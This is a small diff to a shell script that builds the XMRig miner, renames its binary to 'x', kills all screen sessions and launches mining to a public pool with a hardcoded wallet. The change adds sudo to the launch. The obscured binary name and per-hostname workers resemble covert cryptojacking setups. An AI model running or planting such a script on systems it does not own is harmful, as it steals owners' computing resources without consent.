@@ -7,6 +7,6 @@ make -j$(nproc)
 mv xmrig x
 killall screen
 screen -dmS s
-screen -S s -X stuff "cd ~/xmrig/build && echo Setup complete, starting XMRig... && ./x -o pool.supportxmr.com:443 -u 47sbi6AB9XrTYbtp4JDMKvftnhBo3Q5BLGtNjgBr9afNBgziCToTTWq8Pd4RrMK7ftEu9JbZpjJqKSud3NgL9cCKFJfmjVy -k --tls -p $HOSTNAME\n"
+screen -S s -X stuff "cd ~/xmrig/build && echo Setup complete, starting XMRig... && sudo ./x -o pool.supportxmr.com:443 -u 47sbi6AB9XrTYbtp4JDMKvftnhBo3Q5BLGtNjgBr9afNBgziCToTTWq8Pd4RrMK7ftEu9JbZpjJqKSud3NgL9cCKFJfmjVy -k --tls -p $HOSTNAME\n"
 timeout 1s echo Opening screen
 screen -r s
